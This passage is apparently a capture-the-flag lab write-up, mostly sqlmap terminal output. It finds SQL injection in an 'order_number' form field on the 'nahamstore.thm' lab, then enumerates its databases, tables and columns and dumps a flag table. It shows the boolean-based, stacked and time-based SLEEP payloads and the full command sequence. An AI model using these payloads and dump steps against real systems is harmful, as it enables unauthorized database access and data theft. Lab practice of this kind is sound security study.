+[00:22:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[00:22:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[00:22:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[00:22:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[00:22:04] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[00:22:04] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[00:22:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[00:22:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[00:22:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:22:05] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:22:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[00:22:05] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[00:22:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[00:22:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[00:22:06] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:22:06] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[00:22:06] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[00:22:07] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[00:22:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[00:22:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[00:22:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[00:22:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[00:22:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[00:22:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[00:22:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[00:22:09] [INFO] testing 'Generic inline queries'
+[00:22:09] [INFO] testing 'MySQL inline queries'
+[00:22:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[00:22:20] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[00:22:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[00:22:31] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[00:22:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:22:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[00:22:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[00:22:32] [INFO] target URL appears to have 7 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[00:22:45] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[00:22:49] [INFO] target URL appears to be UNION injectable with 7 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[00:23:01] [INFO] testing 'MySQL UNION query (61) - 1 to 20 columns'
+[00:23:12] [INFO] testing 'MySQL UNION query (61) - 21 to 40 columns'
+[00:23:17] [INFO] testing 'MySQL UNION query (61) - 41 to 60 columns'
+[00:23:21] [INFO] testing 'MySQL UNION query (61) - 61 to 80 columns'
+[00:23:26] [INFO] testing 'MySQL UNION query (61) - 81 to 100 columns'
+[00:23:30] [INFO] checking if the injection point on (custom) POST parameter 'MULTIPART order_number' is a false positive
+(custom) POST parameter 'MULTIPART order_number' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 331 HTTP(s) requests:
+---
+Parameter: MULTIPART order_number ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND 9631=9631
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1;SELECT SLEEP(5)#
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+---
+[00:23:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+[00:23:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:23:32 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_2 --batch --dbs
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.7.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:26:30 //
+
+[00:26:30] [INFO] parsing HTTP request from 'req_2'
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:26:31] [INFO] resuming back-end DBMS 'mysql' 
+[00:26:31] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://nahamstore.thm:80/returns/168?auth=006f52e9102a8d3be2fe5614f42ba989'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART order_number ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND 9631=9631
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1;SELECT SLEEP(5)#
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+---
+[00:26:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+[00:26:31] [INFO] fetching database names
+[00:26:31] [INFO] fetching number of databases
+[00:26:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[00:26:31] [INFO] retrieved: 
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+2
+[00:26:33] [INFO] retrieved: information_schema
+[00:27:00] [INFO] retrieved: nahamstore
+available databases [2]:
+[*] information_schema
+[*] nahamstore
+
+[00:27:15] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:27:15 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_2 --batch -D nahamstore --tables
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:27:40 //
+
+[00:27:40] [INFO] parsing HTTP request from 'req_2'
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:27:41] [INFO] resuming back-end DBMS 'mysql' 
+[00:27:41] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://nahamstore.thm:80/returns/258?auth=502e4a16930e414107ee22b6198c578f'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART order_number ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND 9631=9631
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1;SELECT SLEEP(5)#
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+---
+[00:27:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+[00:27:41] [INFO] fetching tables for database: 'nahamstore'
+[00:27:41] [INFO] fetching number of tables for database 'nahamstore'
+[00:27:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[00:27:41] [INFO] retrieved: 
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+2
+[00:27:43] [INFO] retrieved: order
+[00:27:51] [INFO] retrieved: sqli_two
+Database: nahamstore
+[2 tables]
++----------+
+| order    |
+| sqli_two |
++----------+
+
+[00:28:04] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:28:04 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_2 --batch -D nahamstore -T sqli_two --columns
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.7.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:28:57 //
+
+[00:28:57] [INFO] parsing HTTP request from 'req_2'
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:28:58] [INFO] resuming back-end DBMS 'mysql' 
+[00:28:58] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://nahamstore.thm:80/returns/308?auth=a8c88a0055f636e4a163a5e3d16adab7'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART order_number ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND 9631=9631
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1;SELECT SLEEP(5)#
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+---
+[00:28:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+[00:28:58] [INFO] fetching columns for table 'sqli_two' in database 'nahamstore'
+[00:28:58] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[00:28:58] [INFO] retrieved: 
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+2
+[00:29:00] [INFO] retrieved: id
+[00:29:04] [INFO] retrieved: int
+[00:29:08] [INFO] retrieved: flag
+[00:29:14] [INFO] retrieved: varchar(34)
+Database: nahamstore
+Table: sqli_two
+[2 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| flag   | varchar(34) |
+| id     | int         |
++--------+-------------+
+
+[00:29:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:29:32 //
+
+                                                                                                                   
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_2 --batch -D nahamstore -T sqli_two --dump   
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:29:39 //
+
+[00:29:39] [INFO] parsing HTTP request from 'req_2'
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:29:40] [INFO] resuming back-end DBMS 'mysql' 
+[00:29:40] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://nahamstore.thm:80/returns/376?auth=142949df56ea8ae0be8b5306971900a4'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: MULTIPART order_number ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND 9631=9631
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1;SELECT SLEEP(5)#
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+---
+[00:29:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+[00:29:40] [INFO] fetching columns for table 'sqli_two' in database 'nahamstore'
+[00:29:40] [INFO] resumed: 2
+[00:29:40] [INFO] resumed: id
+[00:29:40] [INFO] resumed: flag
+[00:29:40] [INFO] fetching entries for table 'sqli_two' in database 'nahamstore'
+[00:29:40] [INFO] fetching number of entries for table 'sqli_two' in database 'nahamstore'
+[00:29:40] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[00:29:40] [INFO] retrieved: 
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+1
+[00:29:42] [INFO] retrieved: {212ec3b036925a38b7167cf9f0243015}
+[00:30:39] [INFO] retrieved: 1
+Database: nahamstore
+Table: sqli_two
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {212ec3b036925a38b7167cf9f0243015} |
++----+------------------------------------+
+
+[00:30:41] [INFO] table 'nahamstore.sqli_two' dumped to CSV file '/home/witty/.local/share/sqlmap/output/nahamstore.thm/dump/nahamstore/sqli_two.csv'
+[00:30:41] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:30:41 //
+
+Was a long journey!
+```
+Flag 1
+*{d890234e20be48ff96a2f9caab0de55c}*
+Flag 2 ( blind )
+*{212ec3b036925a38b7167cf9f0243015}*
+
+## Notes / Lessons Learned
+[[Tempest]]
+
